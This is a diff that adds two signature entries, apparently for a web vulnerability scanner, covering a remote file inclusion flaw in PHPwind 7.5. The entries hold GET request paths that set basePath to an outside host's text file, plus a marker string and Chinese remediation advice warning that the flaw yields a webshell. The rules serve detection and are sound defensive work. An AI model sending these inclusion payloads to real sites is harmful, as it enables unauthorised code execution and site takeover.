@@ -1,0 +1,2 @@
+﻿50125#d9Fa0j#HIGH#d9Fa0j#PHPwind7.5包含漏洞#d9Fa0j#/apps/groups/index.php?route=groups&basePath=http://www.nvs.com/nvs_test.txt#d9Fa0j#GET#d9Fa0j#test_nvs_test#d9Fa0j#PHPwind7.5由于程序没有对route和basePatch变量进行初始化导致包含漏洞的存在，包含漏洞可以直接获得Webshell，请管理员立即升级phpweind到最新版本#d9Fa0j#
+50125#d9Fa0j#HIGH#d9Fa0j#PHPwind7.5包含漏洞#d9Fa0j#/apps/share/index.php?route=groups&basePath=http://www.nvs.com/nvs_test.txt#d9Fa0j#GET#d9Fa0j#test_nvs_test#d9Fa0j#PHPwind7.5由于程序没有对route和basePatch变量进行初始化导致包含漏洞的存在，包含漏洞可以直接获得Webshell，请管理员立即升级phpweind到最新版本或者打上相关补丁#d9Fa0j#
